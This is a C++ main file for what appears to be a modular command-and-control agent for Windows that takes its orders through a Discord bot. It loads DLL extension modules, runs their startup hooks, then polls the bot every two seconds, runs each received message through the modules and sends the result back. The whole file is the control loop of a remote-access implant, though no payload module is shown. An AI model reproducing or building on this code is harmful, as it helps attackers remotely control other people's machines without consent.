// main.cpp
#include <windows.h>
#include <iostream>
#include <unordered_map>
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "ws2_32.lib")

#include "./ConfigManager/Config.h"
#include "./src/CommandsAndControll.h"
#include "./src/ModuleLoading.h"
#include "./src/FunctionPointer.h"
#include "./src/Util.h"
#include "./src/Types.h"
#include "./Communication/discord_bot/discord_bot.h"

//Global variables
FunctionPointer get_message_pointer;
FunctionPointer send_message_pointer;
std::unordered_map<std::string, ModuleStruct> modules;

static int set_required_functions(const bool& local) {
    if (local) {
        get_message_pointer.setDirect(reinterpret_cast<FARPROC>(get_message));
        get_message_pointer.function_type = FunctionType::SINGLE;
        get_message_pointer.calling_type = CallingType::MANUAL;
        get_message_pointer.return_type = ValueType::CHAR_TYPE;
        get_message_pointer.argCount = 0;

        FunctionPointer start_bot_pointer;
        start_bot_pointer.setDirect(reinterpret_cast<FARPROC>(start_bot));
        start_bot_pointer.function_type = FunctionType::THREAD;
        start_bot_pointer.calling_type = CallingType::MANUAL;
        start_bot_pointer.return_type = ValueType::NONE_TYPE;
        start_bot_pointer.argCount = 0;
        start_bot_pointer.autoCall();
    }
    else {
        get_message_pointer = findFunction(modules, "discord_bot.dll", "get_message").fp;
        send_message_pointer = findFunction(modules, "discord_bot.dll", "send_message").fp;
    }
    return 0;
}
static int startup(const std::unordered_map<std::string, FunctionPointer>& functions) {
    for (const auto& funcEntry : functions) {
        const FunctionPointer& functionPtr = funcEntry.second;

        if (functionPtr.calling_type == CallingType::STARTUP) {
            FunctionResult result = functionPtr.autoCall();
            std::cout << "Startup application -> " << funcEntry.first << " and the result is: " << static_cast<int>(result.resultID) << std::endl; //Debug
        }
    }
    return 1;
}
static void loop() {
    FunctionResult result;
    char* message;
    std::string message_result;
    while (true) {
        result = get_message_pointer.autoCall();
        message = result.value.char_result;
        if (result.value.char_result != nullptr) {
            std::cout << "Result is -> " << message << std::endl;
            message_result = processMessage(modules, std::string(message)).value;
            send_message_pointer.autoCall(message_result.c_str());
        }
        Sleep(2000);
    }
}
int main() {
    Sleep(2000);
    modules = getExtensions();
    for (const auto& [moduleName, moduleStruct] : modules) {
        startup(moduleStruct.functions);
    }
    set_required_functions(false);
    std::cout << format::getPrintableModules(modules, true);
    loop();
    return 0;
}